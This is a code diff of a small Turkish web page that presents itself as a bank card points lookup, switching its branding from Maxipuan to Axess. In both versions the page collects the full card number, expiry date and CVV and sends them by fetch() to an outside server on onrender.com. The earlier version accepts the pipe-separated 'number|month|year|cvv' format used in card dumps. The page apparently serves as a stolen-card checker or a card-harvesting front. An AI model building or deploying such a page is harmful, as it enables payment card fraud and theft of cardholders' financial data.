@@ -1,42 +1,52 @@
-<!DOCTYPE html><html lang="tr">
+<!DOCTYPE html>
+<html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Puan Sorgulama</title>
+  <meta charset="UTF-8" />
+  <title>Axess Puan Sorgulama</title>
   <style>
-    body { font-family: sans-serif; background: #121212; color: #fff; padding: 20px; }
-    input, button, select { padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-top: 10px; width: 100%; }
-    button { background: #00c853; color: white; cursor: pointer; }
-    .result { margin-top: 20px; padding: 10px; background: #1e1e1e; border-radius: 5px; }
+    body { font-family: Arial; padding: 20px; }
+    input { margin: 5px 0; padding: 5px; width: 250px; }
+    button { padding: 8px 15px; margin-top: 10px; }
+    #sonuc { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h2>Maxipuan Sorgulama</h2>
-  <input type="text" id="card" placeholder="Kart Bilgisi (|||| ile ayırın)">
-  <button onclick="checkPoints()">Kontrol Et</button>  <div id="result" class="result"></div>  <script>
-    async function checkPoints() {
-      const resultBox = document.getElementById("result");
-      const cardRaw = document.getElementById("card").value.trim();
+  <h2>Axess Kart Puan Sorgulama</h2>
+  <input type="text" id="cc" placeholder="Kart Numarası (16 haneli)" /><br />
+  <input type="text" id="month" placeholder="Ay (MM)" /><br />
+  <input type="text" id="year" placeholder="Yıl (YYYY)" /><br />
+  <input type="text" id="cvv" placeholder="CVV (3 haneli)" /><br />
+  <button onclick="sorgula()">Sorgula</button>
 
-      if (!cardRaw.includes("|")) {
-        resultBox.innerText = "Lütfen kartı 4543xxxxxxxxxxxx|ay|yıl|cvv şeklinde girin.";
-        return;
-      }
+  <div id="sonuc"></div>
 
-      const [cc, month, year, cvv] = cardRaw.split("|");
+  <script>
+    async function sorgula() {
+      const cc = document.getElementById("cc").value;
+      const month = document.getElementById("month").value;
+      const year = document.getElementById("year").value;
+      const cvv = document.getElementById("cvv").value;
+
+      const sonuc = document.getElementById("sonuc");
+      sonuc.innerText = "Sorgulanıyor...";
 
       try {
-        resultBox.innerText = "Sorgulanıyor...";
-        const res = await fetch("https://hzquarex-puan.onrender.com/api/puan", {
+        const res = await fetch("https://hzquarex-puan.onrender.com/axess-check", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ cc, month, year, cvv })
+          body: JSON.stringify({ cc, month, year, cvv }),
         });
-        const data = await res.text();
-        resultBox.innerHTML = `<strong>Sonuç:</strong><br>${data}`;
-      } catch (e) {
-        resultBox.innerText = "Hata oluştu: " + e.message;
+
+        const data = await res.json();
+        if (data.success) {
+          sonuc.innerText = `Kart Puanı: ${data.data?.PointBalance || "Bilinmiyor"}`;
+        } else {
+          sonuc.innerText = "Hata: " + data.message;
+        }
+      } catch (err) {
+        sonuc.innerText = "Sunucu hatası: " + err.message;
       }
     }
-  </script></body>
+  </script>
+</body>
 </html>
